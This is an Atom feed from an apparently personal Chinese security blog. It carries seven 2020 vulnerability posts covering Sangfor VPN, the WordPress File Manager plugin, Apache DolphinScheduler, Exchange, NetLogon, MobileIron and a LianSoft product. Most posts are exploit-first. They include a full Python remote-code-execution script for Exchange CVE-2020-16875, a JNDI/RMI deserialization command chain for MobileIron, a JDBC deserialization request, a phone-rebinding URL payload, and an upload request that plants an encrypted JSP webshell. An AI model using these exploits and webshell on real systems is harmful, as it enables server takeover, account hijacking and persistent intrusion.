<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>YGnight&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yejinpoxiao.xyz/"/>
  <updated>2020-09-18T02:28:57.797Z</updated>
  <id>https://yejinpoxiao.xyz/</id>
  
  <author>
    <name>YGnight</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>深x服某PN存在任意重置绑定手机号漏洞</title>
    <link href="https://yejinpoxiao.xyz/2020/09/18/%E6%B7%B1X%E6%9C%8D%E6%9F%90PN%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E9%87%8D%E7%BD%AE%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yejinpoxiao.xyz/2020/09/18/%E6%B7%B1X%E6%9C%8D%E6%9F%90PN%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E9%87%8D%E7%BD%AE%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-18T02:16:37.010Z</published>
    <updated>2020-09-18T02:28:57.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>条件：需要登录</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://url/por/changetelnum.csp?apiversion=1newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;payload&quot;&gt;&lt;a href=&quot;#payload&quot; class=&quot;headerlink&quot; title=&quot;payload&quot;&gt;&lt;/a&gt;payload&lt;/h2&gt;&lt;p&gt;条件：需要登录&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>Wordpress File-manager 任意文件上传漏洞</title>
    <link href="https://yejinpoxiao.xyz/2020/09/18/Wordpress%20File-manager%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yejinpoxiao.xyz/2020/09/18/Wordpress%20File-manager%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-18T02:02:09.792Z</published>
    <updated>2020-09-18T02:13:18.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="File-Manager-插件介绍"><a href="#File-Manager-插件介绍" class="headerlink" title="File Manager 插件介绍"></a>File Manager 插件介绍</h2><p>WordPress文件管理器插件File Manager 为您提供编辑、删除、上载、下载、复制和粘贴文件和文件夹的功能。您可以轻松地将文件夹或任何文件从一个位置复制，移动到另一个位置。File Manager 插件分为免费版本和收费版本</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>file manager 6.0-6.8</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上传phpinfo</p><p><img src="0.png" alt="0"></p><p>访问<a href="http://127.0.0.1/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php" target="_blank" rel="noopener">http://127.0.0.1/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</a></p><p><img src="1.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;File-Manager-插件介绍&quot;&gt;&lt;a href=&quot;#File-Manager-插件介绍&quot; class=&quot;headerlink&quot; title=&quot;File Manager 插件介绍&quot;&gt;&lt;/a&gt;File Manager 插件介绍&lt;/h2&gt;&lt;p&gt;WordPress文
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>两个Apache DolphinScheduler高危漏洞</title>
    <link href="https://yejinpoxiao.xyz/2020/09/18/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/"/>
    <id>https://yejinpoxiao.xyz/2020/09/18/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/</id>
    <published>2020-09-18T01:46:10.895Z</published>
    <updated>2020-09-18T02:02:03.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>Apache  DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p><h2 id="一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"><a href="#一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）" class="headerlink" title="一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"></a>一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）</h2><h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>该漏洞导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface /dolphinscheduler/users/update。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache DolphinScheduler    1.2.0</p><p>Apache DolphinScheduler    1.2.1</p><p>Apache DolphinScheduler    1.3.1</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p><p>1、登录到面板 -&gt; 数据源中心。</p><p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p><p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dolphinscheduler/datasources/connect</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">type=MYSQL&amp;name=test&amp;note=&amp;host=127.0.0.1&amp;port=3306&amp;database=test&amp;</span><br><span class="line"></span><br><span class="line">principal=&amp;userName=root&amp;password=root&amp;connectType=&amp;</span><br><span class="line"></span><br><span class="line">other=&#123;"detectCustomCollations":true,"autoDeserialize":true&#125;</span><br></pre></td></tr></table></figure><h2 id="二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"><a href="#二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）" class="headerlink" title="二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"></a>二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）</h2><h3 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h3><p>该漏洞与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc  connect参数输入{“detectCustomCollations”:true,”autoDeserialize”:true}在DolphinScheduler 服务器上远程执行代码。</p><h2 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache DolphinScheduler  1.2.0</p><p>Apache DolphinScheduler  1.2.1</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>尽快升级版本至1.3.2进行防护，官方下载链接：</p><p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html" target="_blank" rel="noopener">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;Apache  DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Exchange Server 远程代码执行漏洞(CVE-2020-16875)</title>
    <link href="https://yejinpoxiao.xyz/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/"/>
    <id>https://yejinpoxiao.xyz/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/</id>
    <published>2020-09-18T01:31:22.608Z</published>
    <updated>2020-09-18T02:34:27.862Z</updated>
    
    <content type="html"><![CDATA[<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥有以某个Exchange角色进行身份验证的用户权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>microsoft:exchange_server_2016: cu16/cu17</p><p>microsoft:exchange_server_2019: cu5/cu6</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span><span class="params">(str_len=<span class="number">8</span>)</span>:</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(str_len))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xml</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"""&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;dlpPolicyTemplates&gt;</span></span><br><span class="line"><span class="string">  &lt;dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0"&gt;</span></span><br><span class="line"><span class="string">    &lt;contentVersion&gt;4&lt;/contentVersion&gt;</span></span><br><span class="line"><span class="string">    &lt;publisherName&gt;si&lt;/publisherName&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;description&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/description&gt;</span></span><br><span class="line"><span class="string">    &lt;keywords&gt;&lt;/keywords&gt;</span></span><br><span class="line"><span class="string">    &lt;ruleParameters&gt;&lt;/ruleParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommands&gt;</span></span><br><span class="line"><span class="string">      &lt;commandBlock&gt;</span></span><br><span class="line"><span class="string">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt;</span></span><br><span class="line"><span class="string">      &lt;/commandBlock&gt;</span></span><br><span class="line"><span class="string">    &lt;/policyCommands&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt;</span></span><br><span class="line"><span class="string">  &lt;/dlpPolicyTemplate&gt;</span></span><br><span class="line"><span class="string">&lt;/dlpPolicyTemplates&gt;"""</span> % c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_rce</span><span class="params">(t, s, vs, cmd)</span>:</span></span><br><span class="line">    f = &#123;</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: (<span class="literal">None</span>, vs),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$senderBtn'</span>: (<span class="literal">None</span>, <span class="string">"ResultPanePlaceHolder_ButtonsPanel_btnNext"</span>),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$name'</span>: (<span class="literal">None</span>, random_string()),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl'</span>: (<span class="string">"dlprce.xml"</span>, get_xml(cmd)),</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, files=f, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">"(-) failed to trigger rce!"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_viewstate</span><span class="params">(t, s)</span>:</span></span><br><span class="line">    r = s.get(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, verify=<span class="literal">False</span>)</span><br><span class="line">    match = re.search(<span class="string">"&lt;input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" /&gt;"</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the __viewstate!"</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in</span><span class="params">(t, usr, pwd)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">"destination"</span> : <span class="string">"https://%s/owa"</span> % t,</span><br><span class="line">        <span class="string">"flags"</span> : <span class="string">""</span>,</span><br><span class="line">        <span class="string">"username"</span> : usr,</span><br><span class="line">        <span class="string">"password"</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(<span class="string">"https://%s/owa/auth.owa"</span> % t, data=d, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> s.cookies.get(name=<span class="string">'X-OWA-CANARY'</span>) != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the csrf canary!"</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(t, usr, pwd, cmd)</span>:</span></span><br><span class="line">    s = log_in(t, usr, pwd)</span><br><span class="line">    print(<span class="string">"(+) logged in as %s"</span> % usr)</span><br><span class="line">    vs = leak_viewstate(t, s)</span><br><span class="line">    print(<span class="string">"(+) found the __viewstate: %s"</span> % vs)</span><br><span class="line">    trigger_rce(t, s, vs, cmd)</span><br><span class="line">    print(<span class="string">"(+) executed %s as SYSTEM!"</span> % cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">"(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">"(+) eg: %s 192.168.1.1 user123:123456 calc"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    trgt = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">":"</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>], <span class="string">"(-) you need a user and password!"</span></span><br><span class="line">    usr = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    pwd = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    main(trgt, usr, pwd, cmd)</span><br></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>补丁：<a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;详情&quot;&gt;&lt;a href=&quot;#详情&quot; class=&quot;headerlink&quot; title=&quot;详情&quot;&gt;&lt;/a&gt;详情&lt;/h2&gt;&lt;p&gt;由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>NetLogon特权提升漏洞(CVE-2020-1472)</title>
    <link href="https://yejinpoxiao.xyz/2020/09/15/NetLogon%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E(CVE-2020-1472)/"/>
    <id>https://yejinpoxiao.xyz/2020/09/15/NetLogon%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E(CVE-2020-1472)/</id>
    <published>2020-09-15T15:32:14.618Z</published>
    <updated>2020-09-15T15:50:02.633Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系。当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的易受攻击的 Netlogon 安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li><li>Windows Server 2012</li><li>Windows Server 2012 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2016 </li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2019</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server, version 1903 (Server Core installation)</li><li>Windows Server, version 1909 (Server Core installation)</li><li>Windows Server, version 2004 (Server Core installation)</li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>MobileIronMDM 未授权RCE</title>
    <link href="https://yejinpoxiao.xyz/2020/09/15/MobileIronMDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE/"/>
    <id>https://yejinpoxiao.xyz/2020/09/15/MobileIronMDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE/</id>
    <published>2020-09-15T15:11:57.149Z</published>
    <updated>2020-09-15T15:27:46.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-all.jar -A <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> -C "&lt;Command&gt;"</span><br><span class="line">java -cp ./marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://&lt;server-ip&gt;:<span class="number">1099</span>/&lt;codebase&gt; &gt; exp</span><br><span class="line">python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService'</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;exp&quot;&gt;&lt;a href=&quot;#exp&quot; class=&quot;headerlink&quot; title=&quot;exp&quot;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>2020HW第三弹</title>
    <link href="https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%B8%89%E5%BC%B9/"/>
    <id>https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%B8%89%E5%BC%B9/</id>
    <published>2020-09-13T15:45:00.473Z</published>
    <updated>2020-09-13T15:54:44.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="联软科技产品存在任意文件上传和命令执行漏洞："><a href="#联软科技产品存在任意文件上传和命令执行漏洞：" class="headerlink" title="联软科技产品存在任意文件上传和命令执行漏洞："></a>联软科技产品存在任意文件上传和命令执行漏洞：</h2><h3 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h3><p>任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。（猜测利用黑名单的其他后缀名绕过）</p><p>命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/uai/download/uploadfileToPath.htm</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: xxxxx</span><br><span class="line"></span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="input_localfile"; filename="xxx.jsp"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals("POST"))&#123;String k="xxxxxxxxxxxxxxxx";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploadpath"</span><br><span class="line"> </span><br><span class="line">../webapps/notifymsg/devreport/</span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1--</span><br></pre></td></tr></table></figure><p>转载自：大老李  F11Team</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;联软科技产品存在任意文件上传和命令执行漏洞：&quot;&gt;&lt;a href=&quot;#联软科技产品存在任意文件上传和命令执行漏洞：&quot; class=&quot;headerlink&quot; title=&quot;联软科技产品存在任意文件上传和命令执行漏洞：&quot;&gt;&lt;/a&gt;联软科技产品存在任意文件上传和命令执行漏
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
